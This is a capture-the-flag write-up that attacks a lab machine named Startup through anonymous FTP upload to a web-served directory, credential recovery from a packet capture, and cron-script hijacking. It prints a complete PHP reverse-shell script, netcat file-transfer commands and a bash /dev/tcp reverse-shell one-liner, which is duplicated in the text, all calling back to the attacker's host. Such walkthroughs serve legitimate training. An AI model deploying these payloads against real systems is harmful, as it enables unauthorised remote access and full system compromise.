Startup (Rewritten)

Target IP: 10.10.68.149
Challenge Description:

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.68.149 -p- returns the result shown above. There are three TCP ports open on the target machine: FTP, SSH, and HTTP on their standard ports. I will perform an aggressive scan against these ports to identify its applications.


Running an aggressive scan, using the command sudo nmap -sV -A 10.10.68.149 -p 21,22,80, against the three TCP ports returns the result shown above. The two applications that stand out to me are FTP and HTTP. The FTP application allows anonymous login, and the directory ftp is writeable. This means I can upload malicious files inside this directory. There are also two interesting files: important.jpg and notice.txt which I can download on my computer. The HTTP application on port 80 needs enumerating. I will begin my enumeration with the FTP on port 21 first.

Enumeration

Port 21: FTP

I connected to the FTP application on port 21 by running the command ftp 10.10.68.149, anonymous as the password, and no password. Running the command ls -la shows an additional hidden file with the name .test.log.


I downloaded the three files on my machine using the command get .test.log, get important.jpg, and get notice.txt. Time to check their contents.


The only interesting file is notice.txt which contains the message shown above. This message is a big giveaway. The ftp share with the name ftp is writeable. It means, the internal employees are using this share to upload pictures. The second part of the message above mentions people can access these files from the website. There is also an interesting user by the name Maya. Let's put this into context. Since the ftp share is writeable and accessible by the website, I can possibly upload a malicious file and achieve Remote Code Execution (RCE). Time to find out. Time to check the web application on port 80 now.

Port 80: HTTP

The webpage above is returned for this web application. I viewed the source-code of the web application, but I did not find anything useful. Time to perform a directory search.


I performed a directory search by running the command gobuster dir -u http://10.10.68.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,pdf and obtained the result shown above. The entry by the name /files stand out to me.


And voila. I can now access the FTP application directory via the web browser by browsing to http://10.10.68.149/files/ as shown above. I have already checked the files.


I can even access the writeable share ftp as shown above. If I upload files to this share, I can access them at http://10.10.68.149/files/ftp/ by my web browser. I willl upload a malicious PHP script at ftp share using FTP, and access the file over at http://10.10.68.149/files/ftp/ to give me a reverse shell connection. Time to put it to test.

Exploitation

Foothold: Owning the Writeable FTP Share ftp via File Upload Attack & Obtaining a Reverse Shell Connection

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.87.142';
$port = 8443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>

On my machine, I created a file with the name sh3ll.php that contains the PHP Pentest Monkey script shown above. This malicious PHP file will invoke a reverse shell connection from the web server to my machine at port 8443. To run the script, I can access it at http://10.10.68.149/files/ftp/sh3ll.php. Before I access it, I will need to start a listener on my machine to catch the reverse shell connection.


I connected to the ftp application again on the target machine by running the command ftp 10.10.68.149 as anonymous without password. Then I ran the commands cd ftp and put sh3ll.php, as shown above, to upload the malicious PHP script from my machine. Afterwards, I started a listener on my machine at port 8443 using the command nc -lvnp 8443. Time to run the script to own the web server.


After starting the listener on my machine at port 8443, I browsed to http://10.10.68.149/files/ftp/sh3ll.php. Then I instantly obtained a reverse shell connection with the session as www-data, as shown above. Now I have a foothold on the target machine. Time to elevate my privileges on the web server.

Privilege Escalation

Horizontal Privilege Escalation: Credential Hunting Inside suspicious.pcapng of lennie user

When checking for default directories on the machine at /, I noticed the unusual directory share incidents as shown above. This directory is owned by the user www-data. I have access to this directory. Time to check its contents.


Inside the directory incidents, I notice there is a file with the name suspicious.pcapng. This is a WireShark capture file. If this contains network capture, it could contain sensitive data that could be found in network packets. Protocols such as HTTP and FTP are not traffic encrypted, so it is possible to view sensitive data such as login credentials via the network capture packets. Time to transfer this file to my machine and check it.


To transfer the file, I ran the command nc -l -p 1234 > suspicious.pcapng on my machine. This starts a listener on port 1234 and saves the output to the file name suspicious.pcapng. From the target machine, I executed the command nc -w 3 10.14.87.142 1234 < suspicious.pcapng to send the suspicious.pcapng file to my attack machine at port 1234. Afterwards, I ran the command ls -la to show the transfer was successful.


I opened the WireShark capture file on attack machine. When checking the capture file, I notice it is a hack incident. The WireShark capture contains how an attacker attacked the web application and gained access to the web server. After the hacker gained access to the web server, their activity has been captured. In the picture above, I was able to extract the password of the user lennie which is c4ntg3t3n0ughsp1c3.


I ran the command cat /etc/passwd and noticed the user lennie still exists. If the password has not been changed from c4ntg3t3n0ughsp1c3, I can elevate my privileges to this user via su (switch user). And bingo. Using the command su lennie and the password c4ntg3t3n0ughsp1c3, I was able to switch to this new user lennie. I successfully elevated my privileges on the target machine from www-data to lennie, as shown above.

Vertical Privilege Escalation: lennie user to root user via Weak Cron Job Abuse PE

Inside the home directory of the user lennie at /home/lennie, I noticed a directory with the name scripts. Inside this directory, there are two files: planner.sh and startup_list.txt. The planner.sh script contains the interesting script shown above. I am unable to make changes to this main script. But this script seems to be calling the script /etc/print.sh. Can I edit this script instead? Running the command ls -la /etc/print.sh shows I have read, write, and execute privileges over /etc/print.sh. Maybe I can overwrite the contents of the script with a bash reverse shell to obtain a reverse shell connection. If this script


Running the command cat /etc/print.sh shows it is responsible for outputting Done!. Time to replace it with my bash revese shell.


In the picture above, there are two terminals. The bottom terminal is where I catch the reverse shell connection. To do this, I ran the command nc -lvnp 8444 to start the listener. The top terminal is where I SSH into the web server on port 22 as the user lennie. Then using this SSH session, I ran the following commands:

echo '#!/bin/bash' > /etc/print.sh
echo '/bin/bash -i >& /dev/tcp/10.14.87.142/8444 0>&1' >> /etc/print.sh
chmod +x /etc/print.sh
echo '#!/bin/bash' > /etc/print.sh
echo '/bin/bash -i >& /dev/tcp/10.14.87.142/8444 0>&1' >> /etc/print.sh
chmod +x /etc/print.sh

The commands above are responsible for inserting the bash reverse shell inside /etc/print.sh. The last command ensures the script is executable. And after some time, I obtained a root shell on port 8444 as shown in the bottom terminal in the picture above. Now I have root privileges on the web server :)
